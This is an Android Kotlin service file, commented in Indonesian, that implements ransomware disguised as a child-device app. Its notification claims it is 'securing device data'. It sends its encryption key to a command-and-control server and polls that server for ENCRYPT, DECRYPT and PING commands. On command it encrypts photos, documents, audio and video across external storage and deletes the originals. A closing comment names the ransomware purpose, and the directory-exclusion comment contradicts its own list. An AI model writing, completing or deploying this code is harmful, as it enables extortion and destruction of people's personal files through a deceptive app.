package com.sadap.bocahapp.services

import android.app.Service
import android.content.Intent
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.sadap.bocahapp.ChildDeviceManager
import com.sadap.bocahapp.ui.NotificationHelper
import com.sadap.template.crypto.EncryptionUtils
import com.sadap.template.network.C2Client
import com.sadap.template.utils.AppConstants
import org.json.JSONObject
import java.io.File
import java.security.Key
import javax.crypto.Cipher

class DataSecureService : Service() {

    private lateinit var deviceManager: ChildDeviceManager
    private lateinit var notificationHelper: NotificationHelper
    private lateinit var currentEncryptionKey: Key

    private val handler = Handler(Looper.getMainLooper())
    private val commandPoller = object : Runnable {
        override fun run() {
            checkC2Commands()
            handler.postDelayed(this, 10 * 1000) // Poll setiap 10 detik
        }
    }

    // List ekstensi file yang jadi target enkripsi
    private val TARGET_EXTENSIONS = listOf(
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", // Gambar
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", // Dokumen
        ".txt", ".rtf", ".odt", // Teks
        ".mp3", ".wav", ".aac", // Audio
        ".mp4", ".avi", ".mov", ".3gp" // Video
    )

    override fun onCreate() {
        super.onCreate()
        deviceManager = ChildDeviceManager(this)
        notificationHelper = NotificationHelper(this)

        // Mulai Foreground Service
        startForeground(1, notificationHelper.createNotification("Aplikasi Anak Aktif", "Mengamankan data perangkat."))

        // Pastikan ada kunci enkripsi
        currentEncryptionKey = deviceManager.getEncryptionKey() ?: deviceManager.generateAndStoreKey()
        deviceManager.sendKeyToC2(currentEncryptionKey) // Pastikan kunci dikirim ke C2

        // Mulai polling perintah
        handler.post(commandPoller)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Pastikan service terus berjalan
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(commandPoller)
        Log.d("DataSecureService", "Service destroyed.")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun checkC2Commands() {
        val deviceId = deviceManager.getDeviceId()
        val response = C2Client.get("/get_command", mapOf("device_id" to deviceId))

        response?.let {
            try {
                val jsonResponse = JSONObject(it)
                val command = jsonResponse.optString("command")
                val keyForDecryption = jsonResponse.optString("key_for_decryption")

                Log.d("DataSecureService", "Received command: $command")

                when (command) {
                    "ENCRYPT" -> {
                        processFilesRecursive(Environment.getExternalStorageDirectory(), currentEncryptionKey, Cipher.ENCRYPT_MODE)
                        postCommandStatus("ENCRYPTED")
                    }
                    "DECRYPT" -> {
                        keyForDecryption?.let { base64Key ->
                            val decryptionKey = EncryptionUtils.base64ToKey(base64Key)
                            processFilesRecursive(Environment.getExternalStorageDirectory(), decryptionKey, Cipher.DECRYPT_MODE)
                            postCommandStatus("DECRYPTED")
                        } ?: run {
                            Log.e("DataSecureService", "Decryption key not provided for DECRYPT command.")
                            postCommandStatus("DECRYPT_FAILED_NO_KEY")
                        }
                    }
                    "PING" -> postCommandStatus("PONG")
                    "NONE" -> { /* No command, do nothing */ }
                    else -> Log.w("DataSecureService", "Unknown command: $command")
                }

                // Setelah mengeksekusi perintah, kosongkan perintah di C2
                if (command != "NONE") {
                    clearC2Command()
                }

            } catch (e: Exception) {
                Log.e("DataSecureService", "JSON parsing error or command execution failed: ${e.message}")
            }
        }
    }

    private fun clearC2Command() {
        val deviceId = deviceManager.getDeviceId()
        val json = JSONObject().apply { put("device_id", deviceId) }
        C2Client.post("/clear_command", json)
    }

    private fun postCommandStatus(status: String) {
        val deviceId = deviceManager.getDeviceId()
        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("status", status)
        }
        val response = C2Client.post("/post_status", json)
        if (response != null && response.contains("Status diperbarui")) {
            Log.d("DataSecureService", "Status sent to C2 successfully: $status")
        } else {
            Log.e("DataSecureService", "Failed to send status to C2: $response")
        }
    }

    // --- Core Logic: File Processing (Encryption/Decryption) ---
    private fun processFilesRecursive(directory: File, key: Key, cipherMode: Int) {
        if (!directory.exists() || !directory.isDirectory()) return

        val files = directory.listFiles() ?: return

        for (file in files) {
            if (file.isDirectory) {
                // Hindari folder sensitif sistem atau yang mungkin berisi APK yang tidak boleh dienkripsi
                if (!shouldExcludeDirectory(file.name)) {
                    processFilesRecursive(file, key, cipherMode)
                }
            } else {
                if (shouldProcessFile(file, cipherMode)) {
                    try {
                        val newFileName = when (cipherMode) {
                            Cipher.ENCRYPT_MODE -> file.name + AppConstants.ENCRYPTED_EXTENSION
                            Cipher.DECRYPT_MODE -> file.name.removeSuffix(AppConstants.ENCRYPTED_EXTENSION)
                            else -> throw IllegalArgumentException("Invalid cipher mode")
                        }
                        val newFile = File(file.parent, newFileName)
                        EncryptionUtils.processFile(cipherMode, key, file, newFile)
                        file.delete() // Hapus file asli/terenkripsi sebelumnya
                        Log.d("DataSecureService", "Processed: ${file.absolutePath} -> ${newFile.absolutePath}")
                    } catch (e: Exception) {
                        Log.e("DataSecureService", "Error processing file: ${file.absolutePath}", e)
                    }
                }
            }
        }
    }

    private fun shouldProcessFile(file: File, cipherMode: Int): Boolean {
        return when (cipherMode) {
            Cipher.ENCRYPT_MODE -> TARGET_EXTENSIONS.any { file.name.endsWith(it, ignoreCase = true) } && !file.name.endsWith(AppConstants.ENCRYPTED_EXTENSION)
            Cipher.DECRYPT_MODE -> file.name.endsWith(AppConstants.ENCRYPTED_EXTENSION)
            else -> false
        }
    }

    private fun shouldExcludeDirectory(dirName: String): Boolean {
        val excludedDirs = listOf(
            "Android", "WhatsApp", // Contoh direktori yang mungkin tidak ingin langsung dienkripsi
            "Download", "Documents" // Contoh direktori yang sangat ingin dienkripsi, jadi JANGAN EXCLUDE
        )
        return excludedDirs.contains(dirName) || dirName.startsWith(".") // Exclude hidden directories
    }

    // --- Fitur Lokasi (opsional, sebagai umpan) ---
    // Anda bisa mengintegrasikan LocationService.kt di sini
    // Untuk tujuan ransomware, ini bisa dihapus atau disederhanakan
}
